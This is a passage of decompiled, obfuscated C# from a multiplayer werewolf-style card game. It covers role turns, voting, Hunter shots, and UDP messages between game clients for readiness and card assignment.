            strArray = Strings.Split(this.TimerLabel.Text, ":");
            num1 = (int) sbyte.MaxValue;
            continue;
          case 66:
            flag1 = this.RolePlayTime.TryGetValue("Minion", out num2);
            num1 = 2;
            continue;
          case 67:
            goto label_8;
          default:
            goto label_2;
        }
      }
label_8:
      int num3 = 0;
      goto label_10;
label_9:
      num3 = 1;
label_10:
      if (num3 != 0)
        return;
      if ((!strArray[1].Equals(num2.ToString()) ? 1 : 0) == 0)
      {
        this.TurnLabel.Text = "Minions may be looking for beastly allies...";
        if ((!this.InitialRole.Contains("Minion") ? 1 : 0) == 0)
        {
          this.TurnAllowed = true;
label_15:
          int num4 = 14;
          while (true)
          {
            int num5;
            int index;
            bool flag2;
            int num6;
            switch (num4 ^ 54)
            {
              case 56:
                num5 = checked (this.PlayerList.Count - 1);
                num4 = 12;
                continue;
              case 57:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle2 = __methodref (MainForm.Disconnect);
                num4 = 15;
                continue;
              case 58:
                index = 1;
                num4 = 13;
                continue;
              case 59:
                if (index == 0)
                {
                  num4 = 11;
                  continue;
                }
                goto label_29;
              case 60:
                if (flag2)
                {
                  num4 = 8;
                  continue;
                }
                num6 = 1;
                break;
              case 61:
label_23:
                flag2 = "WereWolf".Contains(this.PlayerList[index].GetCardType);
                num4 = 10;
                continue;
              case 62:
                num6 = 0;
                break;
              default:
                goto label_15;
            }
            if (num6 == 0)
              this.SawCard = true;
            checked { ++index; }
label_29:
            if (index <= num5)
              goto label_23;
            else
              break;
          }
        }
      }
      if ((!(Convert.ToInt32(strArray[1]) >= checked (num2 + 5) & this.InitialRole.Equals("Minion")) ? 1 : 0) != 0)
        return;
      this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF48D();
    }

    private void \uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF490()
    {
label_2:
      int num1 = 14;
      string[] strArray;
      bool flag1;
      while (true)
      {
        switch (num1 ^ 57)
        {
          case 54:
            flag1 = strArray[1].Equals(this.RolePlayTime["Seer"].ToString());
            num1 = 1;
            continue;
          case 55:
            strArray = Strings.Split(this.TimerLabel.Text, ":");
            num1 = 15;
            continue;
          case 56:
            if (flag1)
            {
              num1 = 3;
              continue;
            }
            goto label_9;
          case 57:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle1 = __methodref (MainForm.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF48C);
            num1 = 0;
            continue;
          case 58:
            goto label_8;
          default:
            goto label_2;
        }
      }
label_8:
      int num2 = 0;
      goto label_10;
label_9:
      num2 = 1;
label_10:
      if (num2 == 0)
      {
        this.TurnLabel.Text = "Seer may be seeing...";
label_13:
        int num3 = AsciiSnake.\uE5FF\uF096\uF68D\uF781\uF534\uEBFB\uF0C7\uE1C4\uE26D\uE19D\uE793\uED35(5);
        bool flag2;
        while (true)
        {
          switch ((num3 ^ 62) + 59)
          {
            case 0:
              if (flag2)
              {
                num3 = -9;
                continue;
              }
              goto label_20;
            case 1:
              num3 = -7;
              continue;
            case 2:
              flag2 = this.InitialRole.Equals("Seer");
              num3 = -5;
              continue;
            case 3:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle2 = __methodref (MainForm.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF47E);
              num3 = \uF1FC\uEEA7\uF50F\uF2C7\uEBC6\uE0A9\uE31B\uEC49\uE500\uEAD5\uE960\uED7F.\uE88C\uF46E\uE801\uEA56\uF2FE\uF668\uF1B6\uE38C\uE50C\uEB39\uF762\uF415.\uF354\uF214\uF8A8\uEDF0\uE733\uF32A\uF55B\uF1F9\uE459\uE072\uF874\uECBB(13);
              continue;
            case 4:
              goto label_19;
            default:
              goto label_13;
          }
        }
label_19:
        int num4 = 0;
        goto label_21;
label_20:
        num4 = 1;
label_21:
        if (num4 == 0)
          this.TurnAllowed = true;
      }
      if ((!(Convert.ToInt32(strArray[1]) >= checked (this.RolePlayTime["Seer"] + 5) & this.InitialRole.Equals("Seer")) ? 1 : 0) != 0)
        return;
      this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF48D();
    }

    private void \uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF491()
    {
label_2:
      int num1 = 2;
      string[] strArray;
      bool flag1;
      while (true)
      {
        switch (num1 ^ 62)
        {
          case 57:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle1 = __methodref (MainForm.get_ChatBox);
            num1 = 7;
            continue;
          case 58:
            flag1 = strArray[1].Equals(this.RolePlayTime["Robber"].ToString());
            num1 = 5;
            continue;
          case 59:
            if (flag1)
            {
              num1 = 3;
              continue;
            }
            goto label_9;
          case 60:
            strArray = Strings.Split(this.TimerLabel.Text, ":");
            num1 = 4;
            continue;
          case 61:
            goto label_8;
          default:
            goto label_2;
        }
      }
label_8:
      int num2 = 0;
      goto label_10;
label_9:
      num2 = 1;
label_10:
      if (num2 == 0)
      {
        this.TurnLabel.Text = "Robber may be robbing...";
label_13:
        int num3 = 1;
        bool flag2;
        while (true)
        {
          switch (num3 ^ 58)
          {
            case 58:
              if (flag2)
              {
                num3 = 4;
                continue;
              }
              goto label_20;
            case 59:
              num3 = 7;
              continue;
            case 60:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle2 = __methodref (MainForm.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF49F);
              num3 = 6;
              continue;
            case 61:
              flag2 = this.InitialRole.Equals("Robber");
              num3 = 0;
              continue;
            case 62:
              goto label_19;
            default:
              goto label_13;
          }
        }
label_19:
        int num4 = 0;
        goto label_21;
label_20:
        num4 = 1;
label_21:
        if (num4 == 0)
          this.TurnAllowed = true;
      }
      if ((!(Convert.ToInt32(strArray[1]) >= checked (this.RolePlayTime["Robber"] + 5) & this.InitialRole.Equals("Robber")) ? 1 : 0) != 0)
        return;
      this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF48D();
    }

    private void \uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF492()
    {
label_2:
      int num1 = 0;
      string[] strArray;
      bool flag1;
      while (true)
      {
        switch (num1 ^ 59)
        {
          case 56:
            flag1 = strArray[1].Equals(this.RolePlayTime["TroubleMaker"].ToString());
            num1 = 1;
            continue;
          case 57:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle1 = __methodref (MainForm.UpdateCharacterList);
            num1 = 2;
            continue;
          case 58:
            if (flag1)
            {
              num1 = 7;
              continue;
            }
            goto label_9;
          case 59:
            strArray = Strings.Split(this.TimerLabel.Text, ":");
            num1 = 3;
            continue;
          case 60:
            goto label_8;
          default:
            goto label_2;
        }
      }
label_8:
      int num2 = 0;
      goto label_10;
label_9:
      num2 = 1;
label_10:
      if (num2 == 0)
      {
        this.TurnLabel.Text = "Someone may be causing trouble...";
label_13:
        int num3 = VoteMenuForm.\uF1A2\uF27A\uE0B6\uF1B5\uF540\uE7E6\uE54C\uE056\uF550\uF103\uEC30\uE3AF(43);
        bool flag2;
        while (true)
        {
          switch ((num3 ^ 58) + 60)
          {
            case 0:
              num3 = -3;
              continue;
            case 1:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle2 = __methodref (MainForm.UpdateCharacterList);
              num3 = -1;
              continue;
            case 2:
              if (flag2)
              {
                num3 = -14;
                continue;
              }
              goto label_20;
            case 3:
              flag2 = this.InitialRole.Equals("TroubleMaker");
              num3 = -4;
              continue;
            case 4:
              goto label_19;
            default:
              goto label_13;
          }
        }
label_19:
        int num4 = 0;
        goto label_21;
label_20:
        num4 = 1;
label_21:
        if (num4 == 0)
          this.TurnAllowed = true;
      }
      if ((!(Convert.ToInt32(strArray[1]) >= checked (this.RolePlayTime["TroubleMaker"] + 5) & this.InitialRole.Equals("TroubleMaker")) ? 1 : 0) != 0)
        return;
      this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF48D();
    }

    private void \uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF493()
    {
label_2:
      int num1 = VoteMenuForm.\uF1A2\uF27A\uE0B6\uF1B5\uF540\uE7E6\uE54C\uE056\uF550\uF103\uEC30\uE3AF(30);
      string[] strArray;
      int num2;
      bool flag1;
      while (true)
      {
        switch ((num1 ^ 57) + 62)
        {
          case 0:
            strArray = Strings.Split(this.TimerLabel.Text, ":");
            num1 = -6;
            continue;
          case 1:
            flag1 = this.RolePlayTime.TryGetValue("Drunk", out num2);
            num1 = -3;
            continue;
          case 2:
            if (flag1)
            {
              num1 = -1;
              continue;
            }
            goto label_9;
          case 3:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle1 = __methodref (MainForm.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF4A0);
            num1 = -4;
            continue;
          case 4:
            goto label_8;
          default:
            goto label_2;
        }
      }
label_8:
      int num3 = 0;
      goto label_10;
label_9:
      num3 = 1;
label_10:
      if (num3 != 0)
        return;
      if ((!strArray[1].Equals(num2.ToString()) ? 1 : 0) == 0)
      {
        this.TurnLabel.Text = "Drunk may be stumbling around...";
label_14:
        int num4 = 5;
        bool flag2;
        while (true)
        {
          switch (num4 ^ 62)
          {
            case 59:
              num4 = 2;
              continue;
            case 60:
              flag2 = this.InitialRole.Equals("Drunk");
              num4 = 0;
              continue;
            case 61:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle2 = __methodref (MainForm.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF49D);
              num4 = 3;
              continue;
            case 62:
              if (flag2)
              {
                num4 = 1;
                continue;
              }
              goto label_21;
            case 63:
              goto label_20;
            default:
              goto label_14;
          }
        }
label_20:
        int num5 = 0;
        goto label_22;
label_21:
        num5 = 1;
label_22:
        if (num5 == 0)
          this.TurnAllowed = true;
      }
      if ((!(Convert.ToInt32(strArray[1]) >= checked (num2 + 5) & this.InitialRole.Equals("Drunk")) ? 1 : 0) != 0)
        return;
      this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF48D();
    }

    private void \uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF494()
    {
label_2:
      int num1 = 1;
      int num2;
      bool flag1;
      string[] strArray;
      while (true)
      {
        switch (num1 ^ 63)
        {
          case 61:
            flag1 = this.RolePlayTime.TryGetValue("Insomniac", out num2);
            num1 = (int) sbyte.MaxValue;
            continue;
          case 62:
            strArray = Strings.Split(this.TimerLabel.Text, ":");
            num1 = 2;
            continue;
          case 63:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle1 = __methodref (MainForm.set_PlayerName9);
            num1 = 0;
            continue;
          case 64:
            if (flag1)
            {
              num1 = 126;
              continue;
            }
            goto label_9;
          case 65:
            goto label_8;
          default:
            goto label_2;
        }
      }
label_8:
      int num3 = 0;
      goto label_10;
label_9:
      num3 = 1;
label_10:
      if (num3 != 0)
        return;
      if ((!strArray[1].Equals(num2.ToString()) ? 1 : 0) == 0)
      {
        this.TurnLabel.Text = "Insomniac may be waking up...";
label_14:
        int num4 = \uF1FC\uEEA7\uF50F\uF2C7\uEBC6\uE0A9\uE31B\uEC49\uE500\uEAD5\uE960\uED7F.\uE88C\uF46E\uE801\uEA56\uF2FE\uF668\uF1B6\uE38C\uE50C\uEB39\uF762\uF415.\uF354\uF214\uF8A8\uEDF0\uE733\uF32A\uF55B\uF1F9\uE459\uE072\uF874\uECBB(9);
        bool flag2;
        while (true)
        {
          switch ((num4 ^ 56) + 63)
          {
            case 0:
              if (flag2)
              {
                num4 = AsciiSnake.\uE5FF\uF096\uF68D\uF781\uF534\uEBFB\uF0C7\uE1C4\uE26D\uE19D\uE793\uED35(20);
                continue;
              }
              goto label_21;
            case 1:
              num4 = -5;
              continue;
            case 2:
              flag2 = this.InitialRole.Equals("Insomniac");
              num4 = -7;
              continue;
            case 3:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle2 = __methodref (MainForm.get_PlayerName4);
              num4 = -4;
              continue;
            case 4:
              goto label_20;
            default:
              goto label_14;
          }
        }
label_20:
        int num5 = 0;
        goto label_22;
label_21:
        num5 = 1;
label_22:
        if (num5 == 0)
        {
          this.TurnAllowed = true;
          this.Card1.Enabled = true;
        }
      }
      if ((!(Convert.ToInt32(strArray[1]) >= checked (num2 + 5) & this.InitialRole.Equals("Insomniac")) ? 1 : 0) != 0)
        return;
      this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF48D();
    }

    private void \uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF495() => Strings.Split(this.TimerLabel.Text, ":");

    private void \uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF496()
    {
label_2:
      int num1 = AsciiSnake.\uE5FF\uF096\uF68D\uF781\uF534\uEBFB\uF0C7\uE1C4\uE26D\uE19D\uE793\uED35(11);
      string[] strArray;
      bool boolean;
      bool Right;
      while (true)
      {
        switch ((num1 ^ 60) + 60)
        {
          case 0:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle1 = __methodref (MainForm.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF48E);
            num1 = -8;
            continue;
          case 1:
            strArray = Strings.Split(this.TimerLabel.Text, ":");
            num1 = -12;
            continue;
          case 2:
            if (boolean)
            {
              num1 = VoteMenuForm.\uF1A2\uF27A\uE0B6\uF1B5\uF540\uE7E6\uE54C\uE056\uF550\uF103\uEC30\uE3AF(25);
              continue;
            }
            goto label_10;
          case 3:
            boolean = Conversions.ToBoolean(Operators.OrObject((object) strArray[0].Equals(this.RoundTime.ToString()), this.EndRoundVotePassed));
            num1 = -6;
            continue;
          case 4:
            Right = false;
            num1 = -5;
            continue;
          case 5:
            goto label_9;
          default:
            goto label_2;
        }
      }
label_9:
      int num2 = 0;
      goto label_11;
label_10:
      num2 = 1;
label_11:
      if (num2 != 0)
        return;
      this.Invoke((Delegate) new MainForm.\uF44A\uE487\uF52F\uEE05\uF8CB\uECF2\uEDD5\uEC3A\uF4A4\uEA56\uF418\uE3B7(this.RevealAllCards));
label_14:
      int num3 = 7;
      object Instance;
      List<Player> playerList;
      while (true)
      {
        int index;
        bool flag;
        int num4;
        int num5;
        switch (num3 ^ 56)
        {
          case 59:
            Instance = (object) new Player(0, "", "");
            num3 = 6;
            continue;
          case 60:
label_16:
            flag = Operators.ConditionalCompareObjectGreater(this.PlayerList[index].GetVoteCount, NewLateBinding.LateGet(Instance, (System.Type) null, "GetVoteCount", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), false);
            num3 = 122;
            continue;
          case 61:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle2 = __methodref (MainForm.set_PlayerName7);
            num3 = 5;
            continue;
          case 62:
            num4 = checked (this.PlayerList.Count - 1);
            num3 = 121;
            continue;
          case 63:
            this.VMF.Disable_CheckBoxes();
            num3 = 123;
            continue;
          case 64:
            if (index != 0)
            {
              num3 = 4;
              continue;
            }
            goto label_32;
          case 65:
            index = 0;
            num3 = 120;
            continue;
          case 66:
            if (flag)
            {
              num3 = 125;
              continue;
            }
            num5 = 1;
            break;
          case 67:
            num3 = 124;
            continue;
          case 68:
            playerList = new List<Player>();
            num3 = 3;
            continue;
          case 69:
            num5 = 0;
            break;
          default:
            goto label_14;
        }
        if (num5 == 0)
          Instance = (object) this.PlayerList[index];
        checked { ++index; }
label_32:
        if (index <= num4)
          goto label_16;
        else
          break;
      }
      int num6 = checked (this.PlayerList.Count - 1);
      int index1 = 0;
      if (index1 == 0)
        goto label_37;
label_34:
      if ((!this.PlayerList[index1].GetVoteCount.Equals(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(Instance, (System.Type) null, "GetVoteCount", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null))) ? 1 : 0) == 0)
        playerList.Add(this.PlayerList[index1]);
      checked { ++index1; }
label_37:
      if (index1 > num6)
      {
        int num7 = checked (playerList.Count - 1);
        int index2 = 0;
        if (index2 == 0)
          goto label_42;
label_39:
        if ((!playerList[index2].GetCardType.Equals("Hunter") ? 1 : 0) == 0)
        {
          Right = true;
          if (Right)
            goto label_43;
        }
        checked { ++index2; }
label_42:
        if (index2 <= num7)
          goto label_39;
label_43:
        int num8 = checked (this.PlayerList.Count - 1);
        int index3 = 0;
        if (index3 == 0)
          goto label_47;
label_44:
        if ((!Conversions.ToBoolean(Operators.AndObject(this.PlayerList[index3].GetHunterSights, (object) Right)) ? 1 : 0) == 0)
        {
          playerList.Add(this.PlayerList[index3]);
          goto label_48;
        }
        else
          checked { ++index3; }
label_47:
        if (index3 <= num8)
          goto label_44;
label_48:
        int num9 = checked (playerList.Count - 1);
        int index4 = 0;
        if (index4 == 0)
          goto label_50;
label_49:
        this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF46D(this.ChatBox, playerList[index4].GetPlayerName + " Got Shot!");
        checked { ++index4; }
label_50:
        if (index4 > num9)
        {
          this.TurnLabel.Text = "Round Over, See Chat For Results!";
          if ((!this.isMaster ? 1 : 0) != 0)
            return;
          this.GameTime.Enabled = false;
        }
        else
          goto label_49;
      }
      else
        goto label_34;
    }

    public void SetRoundTime(string time)
    {
label_6:
      int num1 = 6;
      int num2 = -4;
      while (true)
      {
        switch ((num2 ^ 55) + 56)
        {
          case 0:
            byte[] bytes;
            switch (num1)
            {
              case 56:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle1 = __methodref (MainForm.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF476);
                num1 = 4;
                goto label_1;
              case 57:
                this.sendingClientPlayerInfo.Send(bytes, bytes.Length);
                num1 = 0;
                goto label_1;
              case 58:
                this.RoundTime = time;
                num1 = 7;
                goto label_1;
              case 59:
                bytes = Encoding.ASCII.GetBytes(this.thisPlayer.GetPlayerName + "<>" + this.thisPlayer.GetCardType + "<>-<>" + this.randomIntegerID.ToString() + "<>" + this.isMaster.ToString() + "<>UpdateRoundTimeLimit<>" + time);
                num1 = 5;
                goto label_1;
              case 60:
                goto label_11;
              default:
                num2 = -2;
                continue;
            }
          case 1:
            goto label_6;
          case 2:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle2 = __methodref (MainForm.get_PlayerName3);
            num2 = AsciiSnake.\uE5FF\uF096\uF68D\uF781\uF534\uEBFB\uF0C7\uE1C4\uE26D\uE19D\uE793\uED35(20);
            continue;
          case 3:
label_1:
            num1 ^= 60;
            break;
        }
        num2 = \uF1FC\uEEA7\uF50F\uF2C7\uEBC6\uE0A9\uE31B\uEC49\uE500\uEAD5\uE960\uED7F.\uE88C\uF46E\uE801\uEA56\uF2FE\uF668\uF1B6\uE38C\uE50C\uEB39\uF762\uF415.\uF354\uF214\uF8A8\uEDF0\uE733\uF32A\uF55B\uF1F9\uE459\uE072\uF874\uECBB(7);
      }
label_11:;
    }

    public object GetRoundTime
    {
      get
      {
label_5:
        int num1 = 5;
        int num2 = 3;
        object roundTime;
        while (true)
        {
          switch (num2 ^ 62)
          {
            case 58:
              RuntimeMethodHandle runtimeMethodHandle1 = __methodref (MainForm.set_Card10);
              num2 = 4;
              continue;
            case 59:
              goto label_5;
            case 60:
              switch (num1)
              {
                case 62:
                  roundTime = (object) this.RoundTime;
                  num1 = 4;
                  goto label_1;
                case 63:
                case 65:
                  goto label_10;
                case 64:
                  RuntimeMethodHandle runtimeMethodHandle2 = __methodref (MainForm.RestartRound);
                  num1 = 123;
                  goto label_1;
                default:
                  num2 = 5;
                  continue;
              }
            case 61:
label_1:
              num1 ^= 59;
              break;
          }
          num2 = 2;
        }
label_10:
        return roundTime;
      }
    }

    public object GetIsMaster
    {
      get
      {
label_7:
        int num1 = VoteMenuForm.\uF1A2\uF27A\uE0B6\uF1B5\uF540\uE7E6\uE54C\uE056\uF550\uF103\uEC30\uE3AF(30);
        int num2 = -7;
        object isMaster;
        while (true)
        {
          switch ((num2 ^ 62) + 60)
          {
            case 0:
              RuntimeMethodHandle runtimeMethodHandle1 = __methodref (MainForm.get_PlayerName6);
              num2 = -6;
              continue;
            case 1:
              switch (num1 + 61)
              {
                case 0:
                  RuntimeMethodHandle runtimeMethodHandle2 = __methodref (MainForm.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF4A1);
                  num1 = \uF1FC\uEEA7\uF50F\uF2C7\uEBC6\uE0A9\uE31B\uEC49\uE500\uEAD5\uE960\uED7F.\uE88C\uF46E\uE801\uEA56\uF2FE\uF668\uF1B6\uE38C\uE50C\uEB39\uF762\uF415.\uF354\uF214\uF8A8\uEDF0\uE733\uF32A\uF55B\uF1F9\uE459\uE072\uF874\uECBB(10);
                  goto label_1;
                case 1:
                  isMaster = (object) this.isMaster;
                  num1 = -6;
                  goto label_1;
                case 2:
                case 3:
                  goto label_10;
                default:
                  num2 = AsciiSnake.\uE5FF\uF096\uF68D\uF781\uF534\uEBFB\uF0C7\uE1C4\uE26D\uE19D\uE793\uED35(5);
                  continue;
              }
            case 2:
              goto label_7;
            case 3:
label_1:
              num1 ^= 63;
              break;
          }
          num2 = VoteMenuForm.\uF1A2\uF27A\uE0B6\uF1B5\uF540\uE7E6\uE54C\uE056\uF550\uF103\uEC30\uE3AF(30);
        }
label_10:
        return isMaster;
      }
    }

    private void \uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF497(
      object _param1,
      EventArgs _param2)
    {
label_2:
      int num1 = \uF1FC\uEEA7\uF50F\uF2C7\uEBC6\uE0A9\uE31B\uEC49\uE500\uEAD5\uE960\uED7F.\uE88C\uF46E\uE801\uEA56\uF2FE\uF668\uF1B6\uE38C\uE50C\uEB39\uF762\uF415.\uF354\uF214\uF8A8\uEDF0\uE733\uF32A\uF55B\uF1F9\uE459\uE072\uF874\uECBB(13);
      bool flag;
      string s;
      while (true)
      {
        switch ((num1 ^ 62) + 59)
        {
          case 0:
            flag = this.ReadyToStart.Checked;
            num1 = -7;
            continue;
          case 1:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle1 = __methodref (MainForm.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF476);
            num1 = -8;
            continue;
          case 2:
            if (flag)
            {
              num1 = -9;
              continue;
            }
            goto label_9;
          case 3:
            s = this.thisPlayer.GetPlayerName + " is Ready.<>" + this.randomIntegerID.ToString();
            num1 = VoteMenuForm.\uF1A2\uF27A\uE0B6\uF1B5\uF540\uE7E6\uE54C\uE056\uF550\uF103\uEC30\uE3AF(30);
            continue;
          case 4:
            goto label_8;
          default:
            goto label_2;
        }
      }
label_8:
      int num2 = 0;
      goto label_10;
label_9:
      num2 = 1;
label_10:
      if (num2 != 0)
        return;
      byte[] bytes = Encoding.ASCII.GetBytes(s);
label_13:
      int num3 = \uF1FC\uEEA7\uF50F\uF2C7\uEBC6\uE0A9\uE31B\uEC49\uE500\uEAD5\uE960\uED7F.\uE88C\uF46E\uE801\uEA56\uF2FE\uF668\uF1B6\uE38C\uE50C\uEB39\uF762\uF415.\uF354\uF214\uF8A8\uEDF0\uE733\uF32A\uF55B\uF1F9\uE459\uE072\uF874\uECBB(9);
      while (true)
      {
        switch ((num3 ^ 60) + 61)
        {
          case 0:
            num3 = VoteMenuForm.\uF1A2\uF27A\uE0B6\uF1B5\uF540\uE7E6\uE54C\uE056\uF550\uF103\uEC30\uE3AF(30);
            continue;
          case 1:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle2 = __methodref (MainForm.get_PlayerName2);
            num3 = -8;
            continue;
          case 2:
            this.ReadyToStart.Enabled = false;
            num3 = -1;
            continue;
          case 3:
            this.sendingClientIsReady.Send(bytes, bytes.Length);
            num3 = -7;
            continue;
          case 4:
            goto label_19;
          default:
            goto label_13;
        }
      }
label_19:;
    }

    private void \uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF498()
    {
      IPEndPoint remoteEP = new IPEndPoint(IPAddress.Any, 9656);
      while (true)
      {
        string[] strArray;
        do
        {
          strArray = Strings.Split(Encoding.ASCII.GetString(this.receivingClientIsReady.Receive(ref remoteEP)), "<>");
          this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF46D(this.ChatBox, strArray[0]);
        }
        while ((!this.isMaster ? 1 : 0) != 0);
        List<string> stringList1 = new List<string>((IEnumerable<string>) this.CharacterList);
        this.isReadyList.Add(strArray[1]);
        if ((!(this.isReadyList.Count >= 3 & this.isReadyList.Count == this.PlayerList.Count) ? 1 : 0) == 0)
        {
          VBMath.Randomize();
          Random random1 = new Random();
          List<string> stringList2 = new List<string>();
          int num1 = checked (this.isReadyList.Count - 1);
          int num2 = 0;
          if (num2 == 0)
            goto label_4;
label_3:
          int index1 = random1.Next(0, checked (stringList1.Count - 1));
          stringList2.Add(stringList1[index1]);
          stringList1.RemoveAt(index1);
          checked { ++num2; }
label_4:
          if (num2 > num1)
          {
            Random random2 = new Random();
            int num3 = checked (this.isReadyList.Count - 1);
            int index2 = 0;
            if (index2 == 0)
              goto label_16;
label_6:
            int index3 = random2.Next(0, checked (stringList2.Count - 1));
label_8:
            int num4 = 6;
            byte[] bytes1;
            string s1;
            while (true)
            {
              switch (num4 ^ 60)
              {
                case 55:
                  // ISSUE: method reference
                  RuntimeMethodHandle runtimeMethodHandle1 = __methodref (MainForm.get_PlayerName3);
                  num4 = 11;
                  continue;
                case 56:
                  this.sendingAssignedCards.Send(bytes1, bytes1.Length);
                  num4 = 5;
                  continue;
                case 57:
                  stringList2.RemoveAt(index3);
                  num4 = 7;
                  continue;
                case 58:
                  s1 = stringList2[index3] + "<>" + this.isReadyList[index2];
                  num4 = 0;
                  continue;
                case 59:
                  num4 = 1;
                  continue;
                case 60:
                  bytes1 = Encoding.ASCII.GetBytes(s1);
                  num4 = 4;
                  continue;
                case 61:
                  goto label_15;
                default:
                  goto label_8;
              }
            }
label_15:
            checked { ++index2; }
label_16:
            if (index2 > num3)
            {
              int num5 = 1;
label_18:
              int index4 = random1.Next(0, checked (stringList1.Count - 1));
label_20:
              int num6 = 12;
              string s2;
              byte[] bytes2;
              while (true)
              {
                switch (num6 ^ 59)
                {
                  case 55:
                    s2 = stringList1[index4] + "<>" + num5.ToString();
                    num6 = 6;
                    continue;
                  case 56:
                    stringList1.RemoveAt(index4);
                    num6 = 0;
                    continue;
                  case 57:
                    // ISSUE: method reference
                    RuntimeMethodHandle runtimeMethodHandle2 = __methodref (MainForm.set_PlayerName5);
                    num6 = 2;
                    continue;
                  case 58:
                    if (num5 > 3)
                    {
                      num6 = 4;
                      continue;
                    }
                    goto label_18;
                  case 59:
                    num6 = 5;
                    continue;
                  case 60:
                    this.sendingAssignedCards.Send(bytes2, bytes2.Length);
                    num6 = 3;
                    continue;
                  case 61:
                    bytes2 = Encoding.ASCII.GetBytes(s2);
                    num6 = 7;
                    continue;
                  case 62:
                    checked { ++num5; }
                    num6 = 1;
                    continue;
                  case 63:
                    goto label_30;
                  default:
                    goto label_20;
                }
              }
            }
            else
              goto label_6;
          }
          else
            goto label_3;
        }
label_30:;
      }
    }

    public void RecieverAssigningCards()
    {
      IPEndPoint remoteEP = new IPEndPoint(IPAddress.Any, 9657);
      while (true)
      {
        byte[] bytes = this.receivingAssignedCards.Receive(ref remoteEP);
label_2:
        int num1 = \uF1FC\uEEA7\uF50F\uF2C7\uEBC6\uE0A9\uE31B\uEC49\uE500\uEAD5\uE960\uED7D.\uE123\uEF7F\uEEEB\uE230\uE2DD\uE2EA\uF079\uF000\uF4BC\uF8BE\uF536\uE7F1(50);
        string[] strArray;
        while (true)
        {
          int num2;
          string Expression;
          int index;
          bool flag;
          int num3;
          switch ((num1 ^ 62) + 54)
          {
            case 0:
              num2 = checked (this.PlayerList.Count - 1);
              num1 = -16;
              continue;
            case 1:
              strArray = Strings.Split(Expression, "<>");
              num1 = VoteMenuForm.\uF1A2\uF27A\uE0B6\uF1B5\uF540\uE7E6\uE54C\uE056\uF550\uF103\uEC30\uE3AF(40);
              continue;
            case 2:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle1 = __methodref (MainForm.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF479);
              num1 = -14;
              continue;
            case 3:
label_6:
              flag = this.PlayerList[index].GetUniquePlayerID.Equals(strArray[1]);
              num1 = -18;
              continue;
            case 4:
              index = 0;
              num1 = -15;
              continue;
            case 5:
              if (index != 0)
              {
